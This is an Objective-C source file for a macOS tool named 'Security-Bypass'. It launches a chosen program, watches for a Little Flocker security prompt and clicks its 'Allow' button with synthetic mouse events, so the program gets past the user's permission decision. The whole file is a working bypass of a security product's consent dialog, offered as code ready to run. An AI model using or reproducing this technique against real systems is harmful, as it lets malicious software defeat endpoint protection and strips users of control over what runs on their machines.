//
//  main.m
//  Security-Bypass
//
//  Created by Sabri on 22/12/2016.
//  Copyright © 2016 Sabri. All rights reserved.
//


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#import <IOKit/graphics/IOGraphicsLib.h>

void doEvent(CGPoint initialMousePosition, CGEventType event) {
    // Left button down
    CGEventRef currentEvent = CGEventCreateMouseEvent(NULL, event, CGPointMake(initialMousePosition.x, initialMousePosition.y), kCGMouseButtonLeft);
    CGEventPost(kCGHIDEventTap, currentEvent);
    CFRelease(currentEvent);
}

void clickOnButton(int width, int height, CGPoint oldLocation) {
    // Click at the Little Flocker position
    CGPoint initialMousePosition = CGPointMake(width, height);
    NSLog(@"Doing some magic...!\n");
    [NSThread sleepForTimeInterval:0.001];
    doEvent(initialMousePosition, kCGEventLeftMouseDown);
    doEvent(initialMousePosition, kCGEventLeftMouseUp);
    [NSThread sleepForTimeInterval:0.001];
    doEvent(CGPointMake(oldLocation.x, oldLocation.y), kCGEventLeftMouseUp);
    [NSThread sleepForTimeInterval:0.001];
}

int main(int argc, const char * argv[]) {
    
    // Ensure args are present
    if(argc < 2) {
        NSLog(@"Please specify the path to the application and its arguments (if any).\n");
        return 0;
    }
    
    NSMutableArray *results = [NSMutableArray array];
    
    // Start at 2
    if(argc > 2) {
        for (int i = 2; i < argc; i++) {
            NSString *str = [[NSString alloc] initWithCString:argv[i] encoding:NSUTF8StringEncoding];
            [results addObject:str];
        }
        
        NSLog(@"Args has been set\n");
        /*for(id element in results) {
            printf("%s", [[element description] UTF8String]);
        }*/
    }
    
    // Get current location
    CGEventRef ourEvent = CGEventCreate(NULL);
    CGPoint    oldLocation   = CGEventGetLocation(ourEvent);
    CFRelease(ourEvent);
    
    // Get size (outdated)
    // Height: 52.87037037037037%
    // Width: 66.04166666666667%
    //int width = ([[NSScreen mainScreen] frame].size.width * 0.6604166666666667);
    //int height = ([[NSScreen mainScreen] frame].size.height * 0.5287037037037037);
    //NSLog(@"Calculated Little Flocker window location\n");
    //printf("%dx%d", width, height);
    
    dispatch_queue_t queue = dispatch_queue_create("pw.pwnsdx.queue", DISPATCH_QUEUE_CONCURRENT);
    
    __block bool isDispatchQueueDone = NO;
    dispatch_async(queue, ^{
        
        NSPipe *pipe = [NSPipe pipe];
        NSFileHandle *file = [pipe fileHandleForReading];
    
        NSTask *task = [[NSTask alloc] init];
        task.launchPath = [NSString stringWithUTF8String:argv[1]];
        if(argc > 2) {
            task.arguments = results;
        }
        task.standardOutput = pipe;
        
        NSLog(@"External program is launching\n");
        [task launch];
        //[file readInBackgroundAndNotify];

        NSData *data = [file readDataToEndOfFile];
        [file closeFile];
    
        NSString *cOutput = [[NSString alloc] initWithData: data encoding: NSUTF8StringEncoding];
        NSLog(@"Output:\n\n%@", cOutput);
        isDispatchQueueDone = YES;
    });
    
    // Don't really know if it's dirty or not, anyway we don't care
    while (1) {
        
        NSLog(@"Checking windows...\n");
        // Ask the window server for the list of windows.
        CFArrayRef windowList = CGWindowListCopyWindowInfo(kCGWindowListOptionAll, kCGNullWindowID);
        NSMutableArray *datas = [(NSArray *) CFBridgingRelease(windowList) mutableCopy];

        for(id element in datas) {
            NSString *kCGWindowName = [element objectForKey:@"kCGWindowName"];
            NSString *kCGWindowLayer = [element objectForKey:@"kCGWindowLayer"];
            //NSLog(@"%@", element);
            if([kCGWindowName isEqualToString:@"Little Flocker"] && [kCGWindowLayer intValue] != 0) {
                
                NSArray *kCGWindowBounds = [element objectForKey:@"kCGWindowBounds"];
                //NSLog(@"%d", [[kCGWindowBounds valueForKey:@"X"] intValue]);
                //NSLog(@"%d", [[kCGWindowBounds valueForKey:@"Y"] intValue]);
                // kCGWindowBounds.X + 666 = full width to button
                // kCGWindowBounds.Y + 280 = full height to button
                
                // Window is present, click on the button "Allow"
                clickOnButton([[kCGWindowBounds valueForKey:@"X"] intValue] + 666, [[kCGWindowBounds valueForKey:@"Y"] intValue] + 280, oldLocation);
                
                // Break outer loop
                goto outer;
                break;
            }
        }
    }
    outer:;
    
    // Don't really know if it's dirty or not, anyway we don't care
    while (1) {
        if(isDispatchQueueDone == YES) {
            break;
        }
    }

    return 0;
}
